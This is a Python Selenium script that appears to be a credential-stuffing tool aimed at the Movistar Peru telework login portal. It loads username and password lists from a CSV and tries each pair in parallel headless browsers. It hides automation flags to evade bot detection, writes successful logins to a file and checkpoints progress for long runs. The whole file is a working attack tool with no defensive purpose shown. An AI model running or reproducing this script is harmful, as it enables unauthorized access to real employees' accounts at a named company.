import time
import pandas as pd
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from tqdm import tqdm
from colorama import Fore, Style, init
import os
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Configurar logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(threadName)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('login_results.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Inicializar colores
init(autoreset=True)

# URL del login
URL = "https://teletrabajo.movistar.pe"

# Lock para escritura segura
file_lock = threading.Lock()
progress_lock = threading.Lock()

def cargar_credenciales_csv():
    """Cargar credenciales desde el archivo CSV"""
    try:
        if os.path.exists("credenciales.csv"):
            # Intentar con múltiples codificaciones y separadores
            encodings = ['utf-8', 'latin-1', 'iso-8859-1', 'cp1252', 'windows-1252']
            separadores = [',', ';', '\t', '|']
            df = None
            encoding_usado = None
            separador_usado = None
            
            for encoding in encodings:
                for sep in separadores:
                    try:
                        df = pd.read_csv("credenciales.csv", encoding=encoding, sep=sep)
                        # Verificar que tenga al menos 2 columnas
                        if len(df.columns) >= 2:
                            encoding_usado = encoding
                            separador_usado = sep
                            break
                    except:
                        continue
                if df is not None and len(df.columns) >= 2:
                    break
            
            if df is None or len(df.columns) < 2:
                print("❌ No se pudo leer el archivo correctamente")
                print("💡 Verifica que el archivo tenga al menos 2 columnas")
                print("💡 Formatos aceptados: CSV con coma (,) punto y coma (;) o tabulación")
                return None
            
            sep_nombre = {',' : 'coma', ';': 'punto y coma', '\t': 'tabulación', '|': 'pipe'}
            print(f"✅ Archivo leído con codificación: {encoding_usado} y separador: {sep_nombre.get(separador_usado, separador_usado)}")
            logger.info(f"CSV leído - Encoding: {encoding_usado}, Separador: {separador_usado}")
            
            # Mostrar columnas encontradas
            print(f"📋 Columnas encontradas en el CSV: {df.columns.tolist()}")
            logger.info(f"Columnas del CSV: {df.columns.tolist()}")
            
            # Verificar que el CSV tenga las columnas necesarias
            columnas_lower = [col.lower().strip() for col in df.columns]
            
            # Buscar columnas de usuario y password con nombres variados
            col_usuario = None
            col_password = None
            
            for i, col in enumerate(df.columns):
                col_lower = col.lower().strip()
                # Detectar columna de usuario
                if col_lower in ['usuario', 'user', 'username', 'login', 'correo', 'email']:
                    col_usuario = col
                # Detectar columna de password
                if col_lower in ['password', 'pass', 'contraseña', 'contrasena', 'clave', 'pwd']:
                    col_password = col
            
            # Si no se encontraron, usar las primeras dos columnas
            if col_usuario is None or col_password is None:
                if len(df.columns) >= 2:
                    col_usuario = df.columns[0]
                    col_password = df.columns[1]
                    print(f"⚠️ Usando primera columna como usuario: '{col_usuario}'")
                    print(f"⚠️ Usando segunda columna como password: '{col_password}'")
                    logger.warning(f"Columnas auto-asignadas: {col_usuario}, {col_password}")
                else:
                    print("❌ El CSV debe tener al menos 2 columnas")
                    print(f"   Columnas actuales: {df.columns.tolist()}")
                    return None
            
            # Renombrar columnas
            df = df.rename(columns={col_usuario: 'usuario', col_password: 'password'})
            
            # Limpiar espacios en blanco
            df['usuario'] = df['usuario'].astype(str).str.strip()
            df['password'] = df['password'].astype(str).str.strip()
            
            # Eliminar filas vacías
            df = df.dropna(subset=['usuario', 'password'])
            
            print(f"✅ Cargadas {len(df)} credenciales del archivo 'credenciales.csv'")
            logger.info(f"Credenciales cargadas: {len(df)}")
            return df
        else:
            print("❌ No se encontró el archivo 'credenciales.csv'")
            print("📝 Crea un archivo CSV con el formato:")
            print("usuario,password")
            print("user1,pass1")
            print("user2,pass2")
            return None
    except Exception as e:
        print(f"❌ Error al cargar credenciales: {e}")
        logger.error(f"Error cargando credenciales: {e}")
        return None

def configurar_driver():
    """Configurar el navegador Chrome con opciones optimizadas para velocidad"""
    options = webdriver.ChromeOptions()
    
    # Modo headless (sin ventana visible) - MÁS RÁPIDO
    options.add_argument("--headless=new")
    options.add_argument("--disable-gpu")
    
    # Optimizaciones de rendimiento
    options.add_argument("--start-maximized")
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--disable-extensions")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    
    # Deshabilitar imágenes y CSS para cargar más rápido
    prefs = {
        "profile.managed_default_content_settings.images": 2,  # No cargar imágenes
        "profile.managed_default_content_settings.stylesheets": 2,  # No cargar CSS
        "profile.default_content_setting_values.notifications": 2,  # Deshabilitar notificaciones
        "disk-cache-size": 4096  # Cache pequeño
    }
    options.add_experimental_option("prefs", prefs)
    
    # Más optimizaciones
    options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
    options.add_experimental_option('useAutomationExtension', False)
    options.add_argument("--disable-logging")
    options.add_argument("--log-level=3")
    options.add_argument("--silent")
    
    # Deshabilitar carga de recursos innecesarios
    options.add_argument("--blink-settings=imagesEnabled=false")
    options.add_argument("--disable-remote-fonts")
    
    try:
        driver = webdriver.Chrome(
            service=Service(ChromeDriverManager().install()),
            options=options
        )
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        logger.info("✅ Navegador configurado exitosamente (modo optimizado)")
        return driver
    except Exception as e:
        logger.error(f"Error al configurar el navegador: {e}")
        return None

def intentar_login(driver, wait, usuario, password):
    """Intentar login con las credenciales proporcionadas"""
    try:
        logger.info(f"🚀 Intentando login para: {usuario}")
        
        # Cargar la página
        driver.get(URL)
        time.sleep(2)
        
        # Esperar y encontrar campo de usuario
        logger.info("👤 Ingresando usuario...")
        input_user = wait.until(
            EC.presence_of_element_located((By.XPATH, '//*[@id="login"]'))
        )
        input_user.clear()
        input_user.send_keys(usuario)
        time.sleep(0.5)
        
        # Encontrar campo de contraseña
        logger.info("🔒 Ingresando contraseña...")
        input_pass = wait.until(
            EC.presence_of_element_located((By.XPATH, '//*[@id="passwd"]'))
        )
        input_pass.clear()
        input_pass.send_keys(password)
        time.sleep(0.5)
        
        # Hacer clic en el botón de login
        logger.info("🔘 Haciendo clic en botón de login...")
        boton_login = wait.until(
            EC.element_to_be_clickable((By.XPATH, '//*[@id="nsg-x1-logon-button"]'))
        )
        boton_login.click()
        
        # Esperar a que la página procese el login
        time.sleep(3)
        
        # Verificar el resultado del login
        resultado = verificar_resultado_login(driver, wait)
        
        if resultado:
            logger.info(f"✅ LOGIN EXITOSO: {usuario}")
            return True
        else:
            logger.info(f"❌ LOGIN FALLIDO: {usuario}")
            return False
            
    except Exception as e:
        logger.error(f"❌ Error en login para {usuario}: {e}")
        return False

def verificar_resultado_login(driver, wait):
    """Verificar si el login fue exitoso"""
    try:
        time.sleep(2)
        url_actual = driver.current_url.lower()
        
        # Verificar mensajes de error comunes
        mensajes_error = [
            "//div[contains(@class, 'error')]",
            "//span[contains(@class, 'error')]",
            "//p[contains(@class, 'error')]",
            "//div[contains(text(), 'incorrecta')]",
            "//div[contains(text(), 'inválido')]",
            "//div[contains(text(), 'error')]",
            "//*[contains(text(), 'usuario o contraseña')]",
            "//*[contains(text(), 'credenciales incorrectas')]"
        ]
        
        for selector in mensajes_error:
            try:
                elemento_error = driver.find_elements(By.XPATH, selector)
                if elemento_error and any(e.is_displayed() for e in elemento_error):
                    logger.info("🚫 Mensaje de error detectado en pantalla")
                    return False
            except:
                continue
        
        # Verificar si seguimos en la página de login
        if "login" in url_actual or driver.current_url == URL:
            logger.info("⚠️ Aún en página de login")
            return False
        
        # Verificar si hay elementos que indiquen login exitoso
        indicadores_exito = [
            "//div[contains(@class, 'dashboard')]",
            "//div[contains(@class, 'home')]",
            "//a[contains(text(), 'Cerrar sesión')]",
            "//a[contains(text(), 'Logout')]",
            "//button[contains(text(), 'Salir')]"
        ]
        
        for selector in indicadores_exito:
            try:
                elementos = driver.find_elements(By.XPATH, selector)
                if elementos and any(e.is_displayed() for e in elementos):
                    logger.info("✅ Indicador de login exitoso detectado")
                    return True
            except:
                continue
        
        # Si la URL cambió y no hay errores, considerarlo exitoso
        if driver.current_url != URL and "login" not in url_actual:
            logger.info("✅ URL cambió, considerando login exitoso")
            return True
        
        logger.info("❓ Estado incierto del login")
        return False
        
    except Exception as e:
        logger.error(f"Error verificando resultado: {e}")
        return False

def guardar_credencial_exitosa(usuario, password):
    """Guardar credencial exitosa inmediatamente (thread-safe)"""
    try:
        with file_lock:
            fecha_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            archivo = "credenciales_exitosas.csv"
            
            # Verificar si el archivo existe
            existe = os.path.exists(archivo)
            
            # Crear DataFrame con la nueva credencial
            df_nueva = pd.DataFrame([{
                'usuario': usuario,
                'password': password,
                'fecha_hora': fecha_hora
            }])
            
            # Guardar (append si existe, crear si no)
            if existe:
                df_nueva.to_csv(archivo, mode='a', header=False, index=False, encoding='utf-8')
            else:
                df_nueva.to_csv(archivo, mode='w', header=True, index=False, encoding='utf-8')
            
            logger.info(f"💾 Credencial guardada: {usuario}")
            
    except Exception as e:
        logger.error(f"Error guardando credencial {usuario}: {e}")

def guardar_checkpoint(indice, total):
    """Guardar progreso actual"""
    try:
        with open("checkpoint.txt", "w") as f:
            f.write(f"{indice},{total}")
    except:
        pass

def cargar_checkpoint():
    """Cargar progreso guardado"""
    try:
        if os.path.exists("checkpoint.txt"):
            with open("checkpoint.txt", "r") as f:
                contenido = f.read().strip()
                if contenido:
                    indice, total = map(int, contenido.split(','))
                    return indice
    except:
        pass
    return 0

def procesar_credencial_thread(args):
    """Función para procesar una credencial en un thread"""
    idx, usuario, password, checkpoint_cada = args
    
    driver = None
    try:
        # Crear driver para este thread
        driver = configurar_driver()
        if driver is None:
            return (idx, usuario, False)
        
        wait = WebDriverWait(driver, 15)
        
        # Intentar login
        resultado = intentar_login(driver, wait, usuario, password)
        
        if resultado:
            # Guardar inmediatamente si es exitoso
            guardar_credencial_exitosa(usuario, password)
        
        # Guardar checkpoint cada N usuarios
        if idx % checkpoint_cada == 0:
            guardar_checkpoint(idx, checkpoint_cada)
        
        return (idx, usuario, resultado)
        
    except Exception as e:
        logger.error(f"Error procesando {usuario}: {e}")
        return (idx, usuario, False)
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass

def main():
    """Función principal del programa"""
    print(Fore.CYAN + "="*70)
    print(Fore.CYAN + "🚀 VALIDADOR DE CREDENCIALES - TELETRABAJO MOVISTAR PERÚ")
    print(Fore.CYAN + "⚡ MODO OPTIMIZADO: Multi-threading + Headless + Sin CSS/imágenes")
    print(Fore.CYAN + "="*70)
    
    # Cargar credenciales
    credenciales = cargar_credenciales_csv()
    if credenciales is None or len(credenciales) == 0:
        return
    
    # Configuración de threads
    NUM_THREADS = int(input("\n🔧 ¿Cuántos navegadores quieres usar en paralelo? (recomendado 3-5): ") or "3")
    CHECKPOINT_CADA = 100
    
    print(f"\n📊 Total de credenciales a probar: {len(credenciales)}")
    print(f"🔀 Usando {NUM_THREADS} navegadores en paralelo")
    print(f"💾 Guardando checkpoint cada {CHECKPOINT_CADA} usuarios")
    
    # Verificar si hay checkpoint previo
    inicio = cargar_checkpoint()
    if inicio > 0:
        respuesta = input(f"\n⚠️ Se encontró progreso previo en índice {inicio}. ¿Continuar desde ahí? (s/n): ")
        if respuesta.lower() != 's':
            inicio = 0
    
    if inicio > 0:
        credenciales = credenciales.iloc[inicio:]
        print(f"▶️ Continuando desde índice {inicio}")
    
    usuarios_exitosos = []
    usuarios_fallidos = []
    
    try:
        # Preparar argumentos para los threads
        tareas = [
            (idx + inicio, row['usuario'], row['password'], CHECKPOINT_CADA)
            for idx, (_, row) in enumerate(credenciales.iterrows())
        ]
        
        print(f"\n🏁 Iniciando procesamiento paralelo...")
        print(f"⏱️ Tiempo estimado: ~{(len(tareas) * 8) / NUM_THREADS / 3600:.1f} horas\n")
        
        # Procesar con ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
            # Enviar todas las tareas
            futures = {executor.submit(procesar_credencial_thread, tarea): tarea for tarea in tareas}
            
            # Procesar resultados con barra de progreso
            with tqdm(total=len(tareas), desc="🔄 Procesando", unit="usuarios") as pbar:
                for future in as_completed(futures):
                    try:
                        idx, usuario, resultado = future.result()
                        
                        if resultado:
                            usuarios_exitosos.append(usuario)
                            tqdm.write(Fore.GREEN + f"✅ [{idx}] LOGIN EXITOSO: {usuario}")
                        else:
                            usuarios_fallidos.append(usuario)
                            
                        pbar.update(1)
                        
                    except Exception as e:
                        logger.error(f"Error obteniendo resultado: {e}")
                        pbar.update(1)
        
        # Mostrar resumen final
        print("\n" + "="*70)
        print("📊 RESUMEN FINAL DE RESULTADOS")
        print("="*70)
        print(f"Total procesadas: {len(credenciales)}")
        print(f"✅ Exitosas: {len(usuarios_exitosos)}")
        print(f"❌ Fallidas: {len(usuarios_fallidos)}")
        print(f"📈 Tasa de éxito: {(len(usuarios_exitosos)/len(credenciales)*100):.2f}%")
        
        if usuarios_exitosos:
            print(f"\n💾 Credenciales exitosas guardadas en: credenciales_exitosas.csv")
            print(f"📝 Total de credenciales válidas: {len(usuarios_exitosos)}")
        else:
            print("\n❌ No se encontraron credenciales válidas")
        
        # Limpiar checkpoint
        if os.path.exists("checkpoint.txt"):
            os.remove("checkpoint.txt")
            
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⚠️ Programa interrumpido por el usuario")
        print(f"💾 Progreso guardado. Puedes reanudar ejecutando el script nuevamente")
        logger.warning("Programa interrumpido por el usuario")
    except Exception as e:
        print(Fore.RED + f"\n❌ Error general: {e}")
        logger.error(f"Error general: {e}")
    finally:
        print("\n✅ Programa finalizado")
        logger.info("Programa finalizado")

if __name__ == "__main__":
    main()